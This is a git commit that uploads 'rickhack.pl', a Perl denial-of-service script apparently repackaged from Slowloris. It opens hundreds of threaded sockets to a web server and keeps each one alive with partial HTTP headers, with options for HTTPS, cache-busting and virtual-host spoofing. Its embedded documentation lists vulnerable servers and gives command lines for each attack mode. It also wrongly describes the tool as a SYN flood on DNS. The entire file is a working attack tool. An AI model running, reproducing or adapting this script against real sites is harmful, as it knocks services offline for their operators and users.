2928541a227dcdb42cbbb54f73426cd83b5338a2
rickgds80 <38327991+rickgds80@users.noreply.github.com>
2022-03-15 20:25:47 -0300

    Add files via upload

---
+++ rickhack.pl
@@ -0,0 +1,425 @@
+#!/usr/bin/perl -w
+use strict;
+use IO::Socket::INET;
+use IO::Socket::SSL;
+use Getopt::Long;
+use Config;
+
+$SIG{'PIPE'} = 'IGNORE';    #Rick Hack Tools V1.0
+
+print <<EOTEXT;
+<<<<<<<<<<<<<< RICK HACK TOOLS V1.0 >>>>>>>>>>>>>>>>>>>>>
+EOTEXT
+
+my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
+my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
+my $result = GetOptions(
+    'shost=s'   => \$shost,
+    'dns=s'     => \$host,
+    'httpready' => \$httpready,
+    'num=i'     => \$connections,
+    'cache'     => \$cache,
+    'port=i'    => \$port,
+    'https'     => \$ssl,
+    'tcpto=i'   => \$tcpto,
+    'test'      => \$test,
+    'timeout=i' => \$timeout,
+    'version'   => \$version,
+);
+
+if ($version) {
+    print "Version 0.7\n";
+    exit;
+}
+
+unless ($host) {
+    print "Usage:\n\n\tperl $0 -dns [www.examplo.com] -options\n";
+    print "\n\tType 'perldoc $0' to see help with examples .\n\n";
+    exit;
+}
+
+unless ($port) {
+    $port = 80;
+    print "Porta Default 80.\n";
+}
+
+unless ($tcpto) {
+    $tcpto = 5;
+    print "Conection default - 5 seg. tcp de timeout.\n";
+}
+
+unless ($test) {
+    unless ($timeout) {
+        $timeout = 100;
+        print "Default de 100 seg. for try again.\n";
+    }
+    unless ($connections) {
+        $connections = 1000;
+        print "Default de 1000 connections.\n";
+    }
+}
+
+my $usemultithreading = 0;
+if ( $Config{usethreads} ) {
+    print "Multithreading enabled.\n";
+    $usemultithreading = 1;
+    use threads;
+    use threads::shared;
+}
+else {
+    print "Dont Have Multithreads Compatibility\n";
+    print "The attack can be more slowless.\n";
+}
+
+my $packetcount : shared     = 0;
+my $failed : shared          = 0;
+my $connectioncount : shared = 0;
+
+srand() if ($cache);
+
+if ($shost) {
+    $sendhost = $shost;
+}
+else {
+    $sendhost = $host;
+}
+if ($httpready) {
+    $method = "POST";
+}
+else {
+    $method = "GET";
+}
+
+if ($test) {
+    my @times = ( "2", "30", "90", "240", "500" );
+    my $totaltime = 0;
+    foreach (@times) {
+        $totaltime = $totaltime + $_;
+    }
+    $totaltime = $totaltime / 60;
+    print "This test can leave $totaltime minutes.\n";
+
+    my $delay   = 0;
+    my $working = 0;
+    my $sock;
+
+    if ($ssl) {
+        if (
+            $sock = new IO::Socket::SSL(
+                PeerAddr => "$host",
+                PeerPort => "$port",
+                Timeout  => "$tcpto",
+                Proto    => "tcp",
+            )
+          )
+        {
+            $working = 1;
+        }
+    }
+    else {
+        if (
+            $sock = new IO::Socket::INET(
+                PeerAddr => "$host",
+                PeerPort => "$port",
+                Timeout  => "$tcpto",
+                Proto    => "tcp",
+            )
+          )
+        {
+            $working = 1;
+        }
+    }
+    if ($working) {
+        if ($cache) {
+            $rand = "?" . int( rand(99999999999999) );
+        }
+        else {
+            $rand = "";
+        }
+        my $primarypayload =
+            "GET /$rand HTTP/1.1\r\n"
+          . "Host: $sendhost\r\n"
+          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+          . "Content-Length: 42\r\n";
+        if ( print $sock $primarypayload ) {
+            print "Connection successful, Glory to Ukraine......\n";
+        }
+        else {
+            print
+"The connection does not be estabilished on $host:$port.\n";
+            print "Thre is something wrong???\nDying.\n";
+            exit;
+        }
+    }
+    else {
+        print "Uhm... canot connect to the host $host:$port.\n";
+        print "There is something wrong?\nDying.\n";
+        exit;
+    }
+    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
+        print "Trying $times[$i] sec. of delay: \n";
+        sleep( $times[$i] );
+        if ( print $sock "X-a: b\r\n" ) {
+            print "\tWorked.\n";
+            $delay = $times[$i];
+        }
+        else {
+            if ( $SIG{__WARN__} ) {
+                $delay = $times[ $i - 1 ];
+                last;
+            }
+            print "\tFail after $times[$i] sec.\n";
+        }
+    }
+
+    if ( print $sock "Connection: Close\r\n\r\n" ) {
+        print "Okay, this is enough, closing all connections.\n";
+        print "Use $delay secounds for -timeout.\n";
+        exit;
+    }
+    else {
+        print "Remote server closed socket.\n";
+        print "Use $delay sec for -timeout.\n";
+        exit;
+    }
+    if ( $delay < 166 ) {
+        print <<EOSUCKS2BU;
+Since the timeout ended up being so small ($delay seconds) and it generally 
+takes between 200-500 threads for most servers and assuming any latency at 
+all...  you might have trouble using RickDos against this target.  You can 
+tweak the -timeout flag down to less than 10 seconds but it still may not 
+build the sockets in time.
+EOSUCKS2BU
+    }
+}
+else {
+    print
+"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";
+
+    if ($usemultithreading) {
+        domultithreading($connections);
+    }
+    else {
+        doconnections( $connections, $usemultithreading );
+    }
+}
+
+sub doconnections {
+    my ( $num, $usemultithreading ) = @_;
+    my ( @first, @sock, @working );
+    my $failedconnections = 0;
+    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
+    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
+    while (1) {
+        $failedconnections = 0;
+        print "\t\tBuilding sockets.\n";
+        foreach my $z ( 1 .. $num ) {
+            if ( $working[$z] == 0 ) {
+                if ($ssl) {
+                    if (
+                        $sock[$z] = new IO::Socket::SSL(
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout  => "$tcpto",
+                            Proto    => "tcp",
+                        )
+                      )
+                    {
+                        $working[$z] = 1;
+                    }
+                    else {
+                        $working[$z] = 0;
+                    }
+                }
+                else {
+                    if (
+                        $sock[$z] = new IO::Socket::INET(
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout  => "$tcpto",
+                            Proto    => "tcp",
+                        )
+                      )
+                    {
+                        $working[$z] = 1;
+                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
+                    }
+                    else {
+                        $working[$z] = 0;
+                    }
+                }
+                if ( $working[$z] == 1 ) {
+                    if ($cache) {
+                        $rand = "?" . int( rand(99999999999999) );
+                    }
+                    else {
+                        $rand = "";
+                    }
+                    my $primarypayload =
+                        "$method /$rand HTTP/1.1\r\n"
+                      . "Host: $sendhost\r\n"
+                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+                      . "Content-Length: 42\r\n";
+                    my $handle = $sock[$z];
+                    if ($handle) {
+                        print $handle "$primarypayload";
+                        if ( $SIG{__WARN__} ) {
+                            $working[$z] = 0;
+                            close $handle;
+                            $failed++;
+                            $failedconnections++;
+                        }
+                        else {
+                            $packetcount++;
+                            $working[$z] = 1;
+                        }
+                    }
+                    else {
+                        $working[$z] = 0;
+                        $failed++;
+                        $failedconnections++;
+                    }
+                }
+                else {
+                    $working[$z] = 0;
+                    $failed++;
+                    $failedconnections++;
+                }
+            }
+        }
+        print "\t\tSending data.\n";
+        foreach my $z ( 1 .. $num ) {
+            if ( $working[$z] == 1 ) {
+                if ( $sock[$z] ) {
+                    my $handle = $sock[$z];
+                    if ( print $handle "X-a: b\r\n" ) {
+                        $working[$z] = 1;
+                        $packetcount++;
+                    }
+                    else {
+                        $working[$z] = 0;
+                        #debugging info
+                        $failed++;
+                        $failedconnections++;
+                    }
+                }
+                else {
+                    $working[$z] = 0;
+                    #debugging info
+                    $failed++;
+                    $failedconnections++;
+                }
+            }
+        }
+        print
+"Current stats:\tRickDoS has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
+        sleep($timeout);
+    }
+}
+
+sub domultithreading {
+    my ($num) = @_;
+    my @thrs;
+    my $i                    = 0;
+    my $connectionsperthread = 50;
+    while ( $i < $num ) {
+        $thrs[$i] =
+          threads->create( \&doconnections, $connectionsperthread, 1 );
+        $i += $connectionsperthread;
+    }
+    my @threadslist = threads->list();
+    while ( $#threadslist > 0 ) {
+        $failed = 0;
+    }
+}
+
+__END__
+
+=head1 TITLE
+
+Denial of Service Tool
+
+=head1 VERSION
+
+Version 0.7 Beta
+
+=head1 DATE
+
+06/17/2012
+
+=head1 AUTHOR
+
+Write by RickHack em Perl
+
+=head1 ABSTRACT
+
+Denial of Service Tool
+
+=head1 AFFECTS
+
+Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...?
+
+=head1 NOT AFFECTED
+
+IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...?
+
+=head1 DESCRIPTION
+
+I recomend use Linux to make attack, this tool make SYN flood on DNS
+
+=head2 Testing
+
+Sintax:
+
+=head3 Testing Example:
+
+./rickhack.pl -dns www.example.com -port 80 -test
+
+For testting the program
+
+=head2 HTTP DoS
+
+HTTP Dos Attack
+
+=head3 HTTP DoS Example:
+
+./rickhack.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5
+
+=head2 HTTPReady Bypass
+
+Attack with httpready
+
+=head3 HTTPReady Bypass Example
+
+./rickhack.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready
+
+=head2 Stealth Host DoS
+
+Attack with stealth mode using virtualhost
+
+=head3 Stealth Host DoS Example:
+
+./rickhack.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com
+
+=head2 HTTPS DoS
+
+Attack on sites with HTTPS, SSL
+
+=head3 HTTPS DoS Example:
+
+./rickhack.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https
+
+=head2 HTTP Cache
+
+Attack with Cache
+
+=head3 HTTP Cache Example:
+
+./rickhack.pl -dns www.example.com -port 80 -timeout 30 -num 500 -cache
+
+=head1 Issues
+
+I think you Like, Glory to Ukraine!!! 
+
+
+
